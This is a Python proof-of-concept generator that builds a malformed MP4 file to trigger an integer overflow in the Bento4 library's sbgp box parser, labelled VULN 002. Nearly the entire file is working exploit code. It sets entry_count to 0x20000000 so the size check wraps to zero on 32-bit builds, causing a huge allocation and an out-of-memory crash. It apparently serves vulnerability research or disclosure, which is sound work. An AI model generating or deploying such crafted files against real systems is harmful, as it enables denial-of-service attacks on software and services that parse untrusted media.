#!/usr/bin/env python3
"""
PoC generator for Bento4 AP4_SbgpAtom integer overflow (VULN 002).

The AP4_SbgpAtom constructor checks:
    if (remains < entry_count * 8)
but entry_count * 8 overflows on 32-bit when entry_count >= 0x20000000,
making the check always false -> check bypassed -> huge SetItemCount -> OOM crash.
"""

import struct
import os
import sys

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_002.mp4")


def make_box(box_type: bytes, payload: bytes) -> bytes:
    """Wrap payload in a 4-byte-size + 4-byte-type box header."""
    assert len(box_type) == 4
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def make_fullbox(box_type: bytes, version: int, flags: int, payload: bytes) -> bytes:
    """FullBox = box header + version(1) + flags(3) + payload."""
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return make_box(box_type, vf + payload)


# -----------------------------------------------------------------------
# sbgp box (the malicious one)
# version=1 layout:
#   [version(1)+flags(3)] [grouping_type(4)] [grouping_type_parameter(4)]
#   [entry_count(4)] [96 bytes padding]
# -----------------------------------------------------------------------
ENTRY_COUNT = 0x20000000   # entry_count * 8 == 0 on 32-bit -> overflow bypasses check

sbgp_payload = (
    b'roll'                          # grouping_type
    + struct.pack(">I", 0)           # grouping_type_parameter (version=1)
    + struct.pack(">I", ENTRY_COUNT) # entry_count — triggers overflow
    + b'\x00' * 96                   # padding (no real entries)
)
sbgp_box = make_fullbox(b'sbgp', 1, 0, sbgp_payload)
assert len(sbgp_box) == 120, f"sbgp size={len(sbgp_box)}, expected 120"

# -----------------------------------------------------------------------
# Minimal stbl child boxes
# -----------------------------------------------------------------------
stsd_box = make_fullbox(b'stsd', 0, 0, struct.pack(">I", 0))        # entry_count=0
stts_box = make_fullbox(b'stts', 0, 0, struct.pack(">I", 0))        # entry_count=0
stsc_box = make_fullbox(b'stsc', 0, 0, struct.pack(">I", 0))        # entry_count=0
stsz_box = make_fullbox(b'stsz', 0, 0,
    struct.pack(">II", 0, 0))                                        # sample_size=0, count=0
stco_box = make_fullbox(b'stco', 0, 0, struct.pack(">I", 0))        # entry_count=0

stbl_payload = stsd_box + stts_box + stsc_box + stsz_box + stco_box + sbgp_box
stbl_box = make_box(b'stbl', stbl_payload)

# -----------------------------------------------------------------------
# dinf / dref (required inside minf)
# -----------------------------------------------------------------------
# url entry: FullBox type='url ', version=0, flags=1 (self-contained), no payload
url_box   = make_fullbox(b'url ', 0, 1, b'')
dref_box  = make_fullbox(b'dref', 0, 0, struct.pack(">I", 1) + url_box)
dinf_box  = make_box(b'dinf', dref_box)

# nmhd (null media header, generic tracks)
nmhd_box  = make_fullbox(b'nmhd', 0, 0, b'')

minf_payload = nmhd_box + dinf_box + stbl_box
minf_box = make_box(b'minf', minf_payload)

# -----------------------------------------------------------------------
# mdia: mdhd + hdlr + minf
# -----------------------------------------------------------------------
# mdhd: version=0 -> creation_time(4)+modification_time(4)+timescale(4)+duration(4)+language(2)+pre_defined(2)
mdhd_box = make_fullbox(b'mdhd', 0, 0,
    struct.pack(">IIIII", 0, 0, 44100, 0, 0) + struct.pack(">H", 0))

# hdlr: version=0 -> pre_defined(4)+handler_type(4)+reserved(12)+name(variable)
hdlr_box = make_fullbox(b'hdlr', 0, 0,
    struct.pack(">I", 0) + b'soun' + b'\x00' * 12 + b'Handler\x00')

mdia_payload = mdhd_box + hdlr_box + minf_box
mdia_box = make_box(b'mdia', mdia_payload)

# -----------------------------------------------------------------------
# trak: tkhd + mdia
# -----------------------------------------------------------------------
# tkhd version=0: creation(4)+modification(4)+track_id(4)+reserved(4)+duration(4)+
#                 reserved2(8)+layer(2)+alt_group(2)+volume(2)+reserved3(2)+matrix(36)+
#                 width(4)+height(4)
tkhd_payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)  # times, track_id, reserved, duration
tkhd_payload += b'\x00' * 8    # reserved
tkhd_payload += struct.pack(">hhhh", 0, 0, 0x0100, 0)  # layer, alt_group, volume, reserved
tkhd_payload += (b'\x00\x01\x00\x00' + b'\x00' * 4 + b'\x00' * 4 +
                 b'\x00' * 4 + b'\x00\x01\x00\x00' + b'\x00' * 4 +
                 b'\x00' * 4 + b'\x00' * 4 + b'\x40\x00\x00\x00')  # matrix (36 bytes)
tkhd_payload += struct.pack(">II", 0, 0)   # width, height

tkhd_box = make_fullbox(b'tkhd', 0, 3, tkhd_payload)
trak_payload = tkhd_box + mdia_box
trak_box = make_box(b'trak', trak_payload)

# -----------------------------------------------------------------------
# moov: mvhd + trak
# -----------------------------------------------------------------------
# mvhd version=0: creation(4)+modification(4)+timescale(4)+duration(4)+rate(4)+volume(2)+
#                 reserved(10)+matrix(36)+pre_defined(24)+next_track_id(4)
mvhd_payload  = struct.pack(">IIIII", 0, 0, 1000, 0, 0x00010000)  # rate=1.0
mvhd_payload += struct.pack(">H", 0x0100) + b'\x00' * 10           # volume + reserved
mvhd_payload += (b'\x00\x01\x00\x00' + b'\x00' * 4 + b'\x00' * 4 +
                 b'\x00' * 4 + b'\x00\x01\x00\x00' + b'\x00' * 4 +
                 b'\x00' * 4 + b'\x00' * 4 + b'\x40\x00\x00\x00')  # matrix
mvhd_payload += b'\x00' * 24    # pre_defined
mvhd_payload += struct.pack(">I", 2)  # next_track_id

mvhd_box = make_fullbox(b'mvhd', 0, 0, mvhd_payload)
moov_payload = mvhd_box + trak_box
moov_box = make_box(b'moov', moov_payload)

# -----------------------------------------------------------------------
# ftyp box
# -----------------------------------------------------------------------
ftyp_box = make_box(b'ftyp', b'isom' + struct.pack(">I", 0) + b'isom')
assert len(ftyp_box) == 20, f"ftyp size={len(ftyp_box)}, expected 20"

# -----------------------------------------------------------------------
# Write the file
# -----------------------------------------------------------------------
data = ftyp_box + moov_box

os.makedirs(OUT_DIR, exist_ok=True)
with open(OUT_FILE, 'wb') as f:
    f.write(data)

print(f"[+] Written {len(data)} bytes to {OUT_FILE}")
print(f"[+] ftyp  : {len(ftyp_box)} bytes")
print(f"[+] moov  : {len(moov_box)} bytes")
print(f"[+] sbgp  : {len(sbgp_box)} bytes  (entry_count=0x{ENTRY_COUNT:08x})")
print(f"[+] Done.")
